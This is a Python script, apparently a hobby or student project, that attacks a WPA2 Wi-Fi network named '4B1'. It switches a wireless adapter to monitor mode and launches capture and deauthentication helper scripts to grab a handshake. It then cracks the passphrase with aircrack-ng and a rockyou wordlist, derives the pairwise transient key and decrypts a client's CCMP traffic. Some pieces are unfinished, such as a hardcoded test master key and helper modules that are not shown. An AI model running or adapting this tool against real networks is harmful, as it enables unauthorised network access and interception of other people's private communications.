import sys
import os
import os.path
from scapy.all import *
import subprocess as sub
import WPA2
from binascii import *
import Handshake


class sniffer():
	def __init__(self):
		self.dfilepath = str(sub.run("pwd", capture_output=True).stdout)[2:-3]

		start = input("First time starting up? [Y/N]:")

		if start == "Y" or start == "y":
			# put everything in monitor mode when starting up
			print("Killing services")
			os.system("sudo airmon-ng check kill")
			print("Starting wlan1mon")
			os.system("sudo airmon-ng start wlan1 1")
			print("Done")

		print("Which wifi do you want to crack")

		self.wifi = "4B1"#input("Wifi name: ")
		self.find_mac()

		print("Starting to sniff")
		self.sniff_packets()

	def find_mac(self):
		print("Finding Mac-Adress")

		os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >".format(self.wifi) + self.dfilepath + "/output.txt")

		wifi_list = open(self.dfilepath + "/output.txt", 'r').read()
		index = wifi_list.index("Address")

		self.mac = wifi_list[index + len("Address: "):index + len("Address: ") + 17]
		self.get_master_key()

	def get_master_key(self):
		# code for cracking the key
		# find key using the iv's in .cap file
		if not os.path.isfile(self.dfilepath + "/WPA_{}-01.cap".format(self.mac)):
			self.make_cap()

		print("Cracking the key")

		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + self.dfilepath + "/rockyou_simple.txt>" + self.dfilepath + "/key_info.txt")
		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
		#index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
		self.master_key = "123456781234567f"

		""" testing ptk"""
		self.test_transient_key = ''

		ttk = []
		t = []
		ind = key_file.index("Transient Key") + len("Transient Key  : ")

		for i in range(ind, ind + 209):
			t.append(key_file[i])

		i = 2

		while i < len(t):
			if i + 3 < len(t):
				ttk.extend(t[i-2:i])
				if t[i] == ' ' and t[i + 3] == ' ':
					i += 2
				else:
					i += 8

			i += 1
				  
		ttk.extend(t[len(t)-5:len(t)-3])
		ttk.extend(t[len(t)-2:])

		for j in ttk:
			self.test_transient_key += j.lower()
		
		#while key_file[index] != ' ':
		#	self.master_key += key_file[index]
		#	index += 1

		print("Key has been found: {}".format(self.master_key))
		print("Finding transient key")

		self.get_transient_key()

	def condense_mac(self, mac):
		condensed_mac = ""

		for i in range(len(mac)):
			if ((i+1) % 3) != 0:
				condensed_mac += mac[i]

		return condensed_mac

	def fill_master_key(self):
		if len(self.master_key) <= 16:
			while len(self.master_key) < 16:
				self.master_key += "0"
		elif len(self.master_key) <= 24:
			while len(self.master_key) < 24:
				self.master_key += "0"
		else:
			while len(self.master_key) < 32:
				self.master_key += "0"

	def get_transient_key(self):
		#self.fill_master_key()
		password = self.master_key
		ssid = self.wifi
		capfile = rdpcap(self.dfilepath + "/WPA_{}-01.cap".format(self.mac))
		handshakes = []

		for i in capfile:
			if i.haslayer(EAPOL):
				handshakes.append(i)

		anonce, snonce = Handshake.find_as_nonce(handshakes)
		anonce = a2b_hex(anonce)
		snonce = a2b_hex(snonce)

		mac_ap = a2b_hex(self.condense_mac(self.mac.lower()))
		mac_cl_bin = a2b_hex(self.condense_mac(handshakes[0].addr1))
		
		self.mac_cl = handshakes[0].addr1

		PKE = b'Pairwise key expansion'  # Standard Set Value so we don't know what it is
		PMK = Handshake.pmk_generation(password, ssid)
		key_data = min(mac_ap, mac_cl_bin) + max(mac_ap, mac_cl_bin) + min(anonce, snonce) + max(anonce, snonce)
		PTK = Handshake.ptk_generation(PMK, PKE, key_data)

		self.transient_key = WPA2.key_to_matrix(PTK)

		nb = len(self.master_key)

		self.rounds = 10

		if nb == 24:
			self.rounds = 12
		elif nb == 32:
			self.rounds = 14

		self.round_keys = WPA2.make_key_streams(self.transient_key, self.rounds)

	def decrypt(self, packet):
		encrypted_mess = WPA2.make_matrix(bytes_hex(packet.getlayer(Dot11CCMP)))

		print("---------------------------")
		print(bytes_hex(packet.getlayer(Dot11CCMP)))
		print(encrypted_mess)
		
		unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.round_keys, self.rounds)
		#unencrypted_mess = self.filter_packets(unencrypted_mess)

		print("---------------------------")
		print("Sender: ", packet.addr1, "\nReceiver: ", packet.addr2)
		print("Message: ")

		return unencrypted_mess

	def filtersniff(self, packet):
		if packet is None:
			pass
		elif packet.haslayer(Dot11CCMP):
			if (packet.addr1 == self.mac_cl) or (packet.addr2 == self.mac_cl):				
				return packet

	def sniff_packets(self):
		sniff(iface="wlan1mon", lfilter=self.filtersniff, prn=self.decrypt)

	def filter_packets(self, message):
		alfabet = [chr(elem) for elem in range(48, 123)]
		filtered_message = ""

		for elem in message:
			if elem == " ":
				filtered_message += " "
			if elem in alfabet or elem.isdigit():
				filtered_message += elem
			else:
				continue

		if len(filtered_message) < 5:
			return ''

		return filtered_message

	def make_cap(self):
		process2 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AirodumpWPA2.py {} {}".format(self.mac, self.dfilepath)])
		process1 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AireplayWPA2.py {}".format(self.mac)])
		process1.wait()
		process2.wait()

sniffer()
